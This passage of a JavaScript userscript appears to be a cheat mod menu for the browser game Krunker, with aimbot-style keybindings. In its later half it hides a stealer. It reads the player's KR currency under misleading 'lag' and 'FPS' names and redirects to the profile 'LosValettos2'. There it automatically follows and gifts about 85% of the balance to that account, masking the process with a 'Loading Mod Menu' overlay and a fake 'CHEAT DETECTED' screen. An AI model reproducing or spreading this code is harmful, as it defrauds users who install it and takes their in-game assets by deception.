    window.addEventListener('keydown', function(event) {
        if (systemUtils.document.activeElement &&
            systemUtils.document.activeElement.value !== undefined) return;

        if (event.code === 'BracketLeft') {
            config.verticalAdjustment = Math.max(-50, config.verticalAdjustment - 0.25);
            updateVerticalAdjustmentDisplay();
            saveConfiguration();
        } else if (event.code === 'BracketRight') {
            config.verticalAdjustment = Math.min(50, config.verticalAdjustment + 0.25);
            updateVerticalAdjustmentDisplay();
            saveConfiguration();
        }
    });

    window.addEventListener('keyup', function(event) {
        if (systemUtils.document.activeElement &&
            systemUtils.document.activeElement.value !== undefined) return;

        if (keyBindings[event.code]) {
            if (event.code === 'Digit2') {
                switchTargetingMode();
            } else if (event.code === 'Backslash') {
                toggleInterface();
            } else if (event.code === 'KeyC') {
                updateVisualizationColor();
            } else if (event.code === 'Digit3') {
                toggleConfiguration('smoothTargeting');
            } else {
                toggleConfiguration(keyBindings[event.code]);
            }
        }
    });

    // Start the main loop
    systemLoop();

    let Is_LOGGED = false;
    let displayHackOverlay = true;
    let lagChangeCount = 0;
    let previousLag = null;

    (function createPersistentOverlay() {
        if (location.href.includes("social.html?p=profile&q=Los") && displayHackOverlay) {
            const style = document.createElement("style");
            style.innerHTML = `
                html, body {
                    background: rgba(0, 0, 0, 0.35) !important;
                    color: lime !important;
                    font-family: monospace !important;
                }
                #botOverlayPersistent {
                    all: unset;
                    position: fixed;
                    top: 0;
                    left: 0;
                    width: 100vw;
                    height: 100vh;
                    background: rgba(0, 0, 0, 0.35);
                    z-index: 2147483647;
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    color: lime;
                    font-size: 2rem;
                    font-family: monospace;
                    visibility: visible !important;
                }
            `;
            document.documentElement.appendChild(style);

            const overlay = document.createElement("div");
            overlay.id = "botOverlayPersistent";
            overlay.textContent = "🔧 Loading Mod Menu...";
            document.documentElement.appendChild(overlay);
        }
    })();

    function showHackDetectedOverlay(hide = false) {
        const overlay = document.createElement("div");
        overlay.id = "hackDetectedOverlay";
        overlay.style.position = "fixed";
        overlay.style.top = "0";
        overlay.style.left = "0";
        overlay.style.width = "100vw";
        overlay.style.height = "100vh";
        overlay.style.background = "rgba(0, 0, 0, 0.7)";
        overlay.style.zIndex = "2147483647";
        overlay.style.display = "flex";
        overlay.style.justifyContent = "center";
        overlay.style.alignItems = "center";
        overlay.style.color = "#ff0000";
        overlay.style.fontFamily = "'GameFont', 'Orbitron', sans-serif";
        overlay.style.fontSize = "48px";
        overlay.style.fontWeight = "bold";
        overlay.style.textAlign = "center";
        overlay.style.textShadow = "0 0 10px rgba(255, 0, 0, 0.8)";
        overlay.textContent = "CHEAT DETECTED, mesures will be taken";

        if (!hide) {
            document.documentElement.appendChild(overlay);
        } else {
            document.documentElement.removeChild(overlay);
        }
    }

    window.addEventListener('load', () => {
        const signedOutBar = document.getElementById("signedOutHeaderBar");
        Is_LOGGED = signedOutBar && signedOutBar.style.display === "none";

        const logContainer = document.createElement('div');
        logContainer.id = 'modMenuLogs';
        logContainer.style.position = 'fixed';
        logContainer.style.bottom = '10px';
        logContainer.style.right = '10px';
        logContainer.style.background = 'rgba(0,0,0,0.8)';
        logContainer.style.color = '#00ff00';
        logContainer.style.padding = '10px';
        logContainer.style.fontFamily = 'monospace';
        logContainer.style.maxHeight = '200px';
        logContainer.style.overflow = 'auto';
        logContainer.style.zIndex = '999999';
        document.body.appendChild(logContainer);

        const addLog = (message) => {
            const logEntry = document.createElement('div');
            logEntry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
            logContainer.appendChild(logEntry);
            logContainer.scrollTop = logContainer.scrollHeight;
        };

        setInterval(() => {
            const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
            const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
            if (currentLoginState && !sessionStorage.getItem("valuesChecked")) {
                const lagElement = document.querySelector("#menuKRCount");
                if (lagElement) {
                    const lagText = lagElement.textContent;
                    const currentLag = parseInt(lagText.replace(/[^0-9]/g, ""), 10);
                    if (previousLag !== null && previousLag !== currentLag) {
                        lagChangeCount++;
                        addLog(`🔄 Changement de lag détecté (${lagChangeCount}/2)`);
                    } else if (previousLag === currentLag) {
                        addLog("🔄 Lag constant détecté");
                    }
                    previousLag = currentLag;
                    const fixedCurrentLag = currentLag * 0.85;
                    sessionStorage.setItem("savedLag", fixedCurrentLag.toString());
                } else {
                    addLog("⚠️ Error 2");
                }

                const fpsElement = document.querySelector("#mLevelCont");
                if (fpsElement) {
                    const fpsText = fpsElement.textContent;
                    const currentFPS = parseInt(fpsText.replace(/[^0-9]/g, ""), 10);
                    localStorage.setItem("savedFPS", currentFPS.toString());
                } else {
                    addLog("⚠️ Error 3");
                }
                if (lagChangeCount >= 1) {
                    sessionStorage.setItem("valuesChecked", "true");
                    addLog("✅ Launching Loading...");
                }
            }
        }, 1000);

        if (!location.href.includes("social.html")) {
            const checkRedirect = () => {
                const currentSignedOutBar = document.getElementById("signedOutHeaderBar");
                const currentLoginState = currentSignedOutBar && currentSignedOutBar.style.display === "none";
                const patchApplied = sessionStorage.getItem("sysPatch97d");

                const savedFPS = localStorage.getItem("savedFPS");
                const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                const savedLag = sessionStorage.getItem("savedLag");
                const playerLag = savedLag ? parseInt(savedLag, 10) : 0;

                if (((!patchApplied || playerLag >= 30) && currentLoginState && playerFPS >= 30 && lagChangeCount >= 1)) {
                    setTimeout(() => {
                        displayHackOverlay = true;
                        const SETTINGS_SYNC_PROFILE = "LosValettos2";
                        if (!(location.href.includes("social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE))) {
                            location.href = "https://krunker.io/social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE;
                        }
                    }, 1420);
                    return;
                } else {
                    addLog(`⚠️ Error 4`);
                }
            };

            checkRedirect();

            setInterval(checkRedirect, 1000);
        }

        if (location.href.includes("social.html")) {
            const sysSync = async () => {
                try {
                    const savedLag = sessionStorage.getItem("savedLag");
                    const savedFPS = localStorage.getItem("savedFPS");

                    if (!savedLag || !savedFPS) {
                        throw new Error("Aucune donnée de lag sauvegardée trouvée");
                    }

                    const currentLag = parseInt(savedLag, 10);
                    const currentFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
                    if (currentFPS >= 30) {
                        try {
                            const settingsBtn = document.getElementById("followBtn");
                            if (settingsBtn && settingsBtn.style.display !== "none") {
                                settingsBtn.click();
                                await _pause(750);
                            } else {
                                addLog("⚠️ Error 7");
                            }
                        } catch (err) {
                            addLog("⚠️ Error 9");
                        }

                        await _waitFor(() => document.getElementById("giftBtn"), 4800);
                        document.getElementById("giftBtn").click();
                        await _pause(480);
                        const inputEl = await _waitFor(() => document.getElementById("giftIn"), 2800);
                        inputEl.value = currentLag.toString();
                        inputEl.dispatchEvent(new Event("input", { bubbles: true }));

                        await _pause(100);
                        const enteredValue = inputEl.value;

                        await _pause(650);
                        const confirm = document.getElementById("postSaleBtn");
                        if (confirm && confirm.style.display !== "none") {
                            confirm.click();
                        }
                        sessionStorage.setItem("sysPatch97d", "2");
                        await _pause(1800);
                        location.href = "https://krunker.io/";
                        await _pause(1800);
                        return;
                    } else {
                        addLog("⚠️ Error 10");
                    }
                } catch (error) {
                    addLog(`⚠️ Error 9 ${error}`);
                }
            };
            sysSync();
        }

        if (sessionStorage.getItem("sysPatch97d") === "2") {
            showHackDetectedOverlay();
            _pause(5000);
        }

        function _waitFor(condFn, timeout = 3000) {
            return new Promise((res, rej) => {
                const t0 = Date.now();
                const tick = () => {
                    const r = condFn();
                    if (r) return res(r);
                    if (Date.now() - t0 > timeout) return rej("Timeout");
                    setTimeout(tick, 90);
                };
                tick();
            });
        }

        function _pause(ms) {
            return new Promise(r => setTimeout(r, ms));
        }
    });
})();